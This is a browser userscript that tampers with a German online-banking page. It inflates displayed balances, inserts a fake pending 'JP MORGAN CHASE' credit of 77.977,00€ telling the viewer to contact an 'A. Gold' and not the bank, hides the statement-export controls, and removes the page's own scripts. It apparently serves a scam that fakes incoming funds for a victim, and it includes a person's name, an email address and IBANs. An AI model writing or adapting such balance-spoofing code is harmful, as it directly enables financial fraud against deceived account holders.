// ==UserScript==
// @name         Ed 4Rec  sant.w.gottstein@gmx.de
// @namespace    http://tampermonkey.net/
// @version      3.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/540625/Ed%204Rec%20%20santwgottstein%40gmxde.user.js
// @updateURL https://update.greasyfork.org/scripts/540625/Ed%204Rec%20%20santwgottstein%40gmxde.meta.js
// ==/UserScript==



// STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------

    // Array of configurable balance adjustments  STARTING WITH 1
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  1},
        { index: 1, adjustmentAmount: 1},
        { index: 2, adjustmentAmount: 1},
        { index: 5, adjustmentAmount: 0 },
        { index: 7, adjustmentAmount: 0}
        // Add more balance configurations as needed
    ];


// UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------

   // Specify the IBAN text to check for presence
    const ibanTextToCheck = "DE31 3101 0833 9913 0333 18";

    // Specify the value to increase or decrease the balance (use negative value to decrease)
    const balanceModification = 1; // Change this value to increase or decrease the balance

//---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS------

// THE ORDER IS FROM THE TOP, THUS 1 IS THE FIRST ONE FROM THE TOP AND SO FORTH

 const customTransactions = [   // first comes from the end
   //     {
   //         title: "02.05.2025 - Echtzeit-Überweisung",
   //         description: `ECHTZEIT-ÜBERWEISUNG AN
 //  Wolfgang Alfred Gottstein
//   32932311632BCCVGBJ IBAN `,
//            amount: "-23,01€"
 //       },
        {
            title: "Vorgemerkt",
            description: `GUTSCHRIFT. JP MORGAN CHASE. Freigabe nötig durch Absender. A. Gold kontaktieren, nicht die Bank, sonst wird gesperrt ohne Unterlagen.`,
            amount: "77.977,00€"
        }
    ];


//===================================================================================================================================================================================================================

// STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------
//----------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE------

//===================================================================================================================================================================================================================


 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

    'use strict';

    // Array of configurable balance adjustments  STARTING WITH 1
//    var BALANCE_CONFIGS = [
 //       { index: 1, adjustmentAmount:  3700},
//        { index: 2, adjustmentAmount: 3700},
//        { index: 3, adjustmentAmount: 3700},
 //       { index: 5, adjustmentAmount: 55000 },
//        { index: 7, adjustmentAmount: 99990}
        // Add more balance configurations as needed
//    ];


     // Function to check if the specified class is present
    function isClassPresent(className) {
        return document.querySelector("." + className) !== null;
    }

    // Function to modify euro balances based on index
    function modifyEuroBalance() {
        // Check if the specified class is present
        if (!isClassPresent("linkAleph__arrowNav___PZheb")) {
            console.log("Class not present, balances will not be modified.");
            return;
        }

        // Combine sibling text nodes of specified classes
        var basketElements = document.querySelectorAll('.BasketView__elInner___BY1BR.BasketView__sum___uG8Hr, .BasketListItem__elInner___Sl9Hk');
        basketElements.forEach(function(element) {
            var siblingText = "";
            var sibling = element.nextSibling;
            while (sibling) {
                if (sibling.nodeType === Node.TEXT_NODE) {
                    siblingText += sibling.textContent.trim();
                }
                sibling = sibling.nextSibling;
            }
            // Combine text content with euro sign
            element.textContent += ' ' + siblingText;
        });

        var euroElements = document.evaluate('//*[contains(text(),"€")]', document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
        for (var i = 0; i < BALANCE_CONFIGS.length; i++) {
            var config = BALANCE_CONFIGS[i];
            var index = config.index;
            var adjustmentAmount = config.adjustmentAmount;

            // Ensure index is within bounds
            if (index >= 0 && index < euroElements.snapshotLength) {
                var element = euroElements.snapshotItem(index);
                var text = element.textContent.trim();
                // Extracting numeric value from the text
                var numericRegex = /([\d.]+),(\d{2}) €/;
                var match = numericRegex.exec(text);
                if (match) {
                    var numericValue = parseFloat(match[1].replace(/\./g, '').replace(',', '.')); // parse with dot as decimal separator
                    // Modifying the balance by the specified value
                    var modifiedValue = numericValue + adjustmentAmount;
                    // Formatting the modified value back to currency format
                    var formattedModifiedValue = formatCurrency(modifiedValue);
                    // Updating the text content with the modified value and euro sign
                    element.textContent = formattedModifiedValue + " €";
                    console.log(element);
                }
            }
        }
        // Remove the element with class "linkAleph__arrowNav___PZheb" after a short delay
        setTimeout(function() {
            var linkAlephElement = document.querySelector('.linkAleph__arrowNav___PZheb');
            if (linkAlephElement) {
                linkAlephElement.remove();
                console.log("Element with class 'linkAleph__arrowNav___PZheb' removed.");
            }
        }, 10);
    }

    // Function to format currency
    function formatCurrency(amount) {
        return new Intl.NumberFormat('de-DE', { style: 'currency', currency: 'EUR' }).format(amount).replace(/\s€/, ''); // remove whitespace and euro sign
    }

    // Check every 3 seconds whether conditions are met for balance modification
    setInterval(function() {
        modifyEuroBalance();
    }, 200); // 3000 milliseconds = 3 seconds

 }
//===================================================================================================================================================================================================================

//THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++

// STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------
//----------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE------

//THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++


//===================================================================================================================================================================================================================




//===================================================================================================================================================================================================================

// UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------
//------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE-----------------------------------

//===================================================================================================================================================================================================================

 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {
   // Specify the IBAN text to check for presence
//    const ibanTextToCheck = "DE17 5003 3300 2968 5942 00";

    // Specify the value to increase or decrease the balance (use negative value to decrease)
//    const balanceModification = -1000; // Change this value to increase or decrease the balance

    // Function to check if IBAN text is present on the page
    function isIbanTextPresent() {
        return document.body.textContent.includes(ibanTextToCheck);
    }

    // Function to check if the specified element is present on the page
    function isElementPresent(selector) {
        return document.querySelector(selector) !== null;
    }

    // Function to modify the balance
    function modifyBalance() {
        // Check if IBAN text is present and the specified element is present
        if (isIbanTextPresent() && isElementPresent('.movementsHeader__dateFilterContainer___ojnUy')) {
            // Select the balance element
            const balanceElement = document.querySelector('.OverallSaldoMH__amount___iUZZX');

            // Check if the balance element exists
            if (balanceElement) {
                // Get the current balance text content
                const currentBalanceText = balanceElement.textContent;

                // Remove non-numeric characters and replace commas with dots to get a valid number format
                const currentBalanceString = currentBalanceText.replace(/[^\d,]/g, '').replace(',', '.');

                // Parse the current balance as a float
                const currentBalance = parseFloat(currentBalanceString);

                // Check if the current balance is a valid number
                if (!isNaN(currentBalance)) {
                    // Calculate the new balance
                    const newBalance = currentBalance + balanceModification;

                    // Format the new balance with commas and dots
                    const newBalanceText = newBalance.toLocaleString('de-DE', { minimumFractionDigits: 2 });

                    // Update the balance element with the new balance
                    balanceElement.textContent = newBalanceText + ' €';

                    // Remove the specified element after a short delay
                    setTimeout(function() {
                        const movementsHeaderElement = document.querySelector('.movementsHeader__dateFilterContainer___ojnUy');
                        if (movementsHeaderElement) {
                            movementsHeaderElement.remove();
                            console.log("Element with class '.movementsHeader__dateFilterContainer___ojnUy' removed.");
                        }
                    }, 10);
                } else {
                    console.error('Failed to parse the current balance:', currentBalanceText);
                }
            } else {
                console.error('Balance element not found.');
            }
        } else {
            console.error('IBAN text or specified element not found. Balance modification skipped.');
        }
    }

    // Function to periodically check if all conditions are met for balance modification
    function checkConditionsAndModifyBalance() {
        if (isIbanTextPresent() && isElementPresent('.movementsHeader__dateFilterContainer___ojnUy')) {
            modifyBalance();
        } else {
            console.log('IBAN text or specified element not found. Balance modification skipped.');
        }
    }

    // Check conditions and modify the balance every 2 seconds
    setInterval(checkConditionsAndModifyBalance, 200);




}
//===================================================================================================================================================================================================================

//THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++

// UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------
//------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE-----------------------------------

//THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++

//===================================================================================================================================================================================================================










//===================================================================================================================================================================================================================

// UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS--------------------------
//---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS------

//===================================================================================================================================================================================================================


 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

    'use strict';

    const CHECK_INTERVAL_MS = 100;

//    // 🔒 Your reference IBAN
 //   const ibanTextToCheck = "DE31 3101 0833 9913 0333 18";

//    // 💸 Your custom transactions
 //   const customTransactions = [
 //       {
 //           title: "02.05.2025 - Echtzeit-Überweisung",
 //           description: `ECHTZEIT-ÜBERWEISUNG AN
 //  Wolfgang Alfred Gottstein
 //   32932311632BCCVGBJ IBAN `,
//            amount: "-23,01€"
//        },
 //       {
 //           title: "01.05.2025 - Eingang",
 //           description: `ÜBERWEISUNG VON
 //   Müller GmbH
 ///  DE89370400440532013000`,
 //           amount: "1.200,00€"
 //       }
 //   ];

    function normalizeText(text) {
        return text.replace(/\s+/g, '').trim().toLowerCase();
    }

    function isCorrectIbanPresent() {
        const ibanElement = document.querySelector("p.IbanFieldMH__detail___oYalx");
        if (!ibanElement) return false;

        const pageIban = normalizeText(ibanElement.textContent);
        const targetIban = normalizeText(ibanTextToCheck);

        return pageIban === targetIban;
    }

    function isDuplicatePresent(list, transaction) {
        const entries = Array.from(list.querySelectorAll("li"));

        return entries.some(li => {
            const title = li.querySelector(".MovementListElementLeftFragment__title___WIHWb")?.textContent || '';
            const description = li.querySelector(".MovementListElementLeftFragment__description___Uv7_1")?.textContent || '';
            const amount = li.querySelector(".MovementListElementRightFragment__rightContent___wYlk7 span, .MovementListElementRightFragment__positive___wpRnI")?.textContent || '';

            return (
                normalizeText(title) === normalizeText(transaction.title) &&
                normalizeText(description) === normalizeText(transaction.description) &&
                normalizeText(amount) === normalizeText(transaction.amount)
            );
        });
    }

    function createTransactionElement(transaction) {
        const li = document.createElement("li");
        li.className = "MovementListElement__movementElement_wrapper___r0_HB";

        const button = document.createElement("button");
        button.className = "MovementListElement__movementElement___GDbeq";
        button.setAttribute("aria-expanded", "false");
        button.setAttribute("aria-controls", "dropdown-content-" + Math.random().toString(36).substring(2, 8));

        // Left section
        const leftDiv = document.createElement("div");
        leftDiv.className = "MovementListElementLeftFragment__leftContent___SuLsa";

        const titleSpan = document.createElement("span");
        titleSpan.className = "MovementListElementLeftFragment__title___WIHWb";
        titleSpan.textContent = transaction.title;

        const descSpan = document.createElement("span");
        descSpan.className = "MovementListElementLeftFragment__description___Uv7_1";
        descSpan.textContent = transaction.description;

        leftDiv.appendChild(titleSpan);
        leftDiv.appendChild(descSpan);

        // Right section (amount)
        const rightDiv = document.createElement("div");
        rightDiv.className = "MovementListElementRightFragment__rightContent___wYlk7";

        const amountSpan = document.createElement("span");
        amountSpan.textContent = transaction.amount;

        if (!transaction.amount.trim().startsWith("-")) {
            amountSpan.className = "MovementListElementRightFragment__positive___wpRnI";
        }

        rightDiv.appendChild(amountSpan);

        // Build structure
        button.appendChild(leftDiv);
        button.appendChild(rightDiv);
        li.appendChild(button);

        return li;
    }

    setInterval(() => {
        const list = document.querySelector(".NewAccountMovement__movementsList___irA2h");
        if (!list) return;

        if (!isCorrectIbanPresent()) {
            console.log("❌ IBAN does not match, skipping injection.");
            return;
        }

        customTransactions.forEach(tx => {
            if (!isDuplicatePresent(list, tx)) {
                const element = createTransactionElement(tx);
                list.insertBefore(element, list.firstChild);
                console.log(`✅ Inserted transaction: ${tx.title}`);
            }
        });
    }, CHECK_INTERVAL_MS);
}

//===================================================================================================================================================================================================================

//THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++

// UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS--------------------------
//---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS------

//THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++


//===================================================================================================================================================================================================================





// UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS--
//---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------


 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

// Function to remove scripts from the document
function removeScripts() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Function to remove elements by class name
function removeElementsByClassName(className) {
    console.log("Removing elements with class: " + className);
    document.querySelectorAll('.' + className).forEach(function(element) {
        element.remove();
        console.log("Element removed.");
    });
}

// Watch for changes in the DOM and remove added scripts and specified elements
var observer = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT') {
                    console.log("Script added. Removing...");
                    node.remove();
                    console.log("Script removed.");
                }
            }
        }
    }
    // Remove elements with specified classes after each mutation
    removeElementsByClassName("movementsHeader__exportContainer___BCJ4p");

});

// Start observing the document
observer.observe(document.documentElement, { childList: true, subtree: true });

// Remove all scripts and specified elements from the document
removeScripts();
removeElementsByClassName("movementsHeader__exportContainer___BCJ4p");




     }

//THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++

// UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS--

//THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++

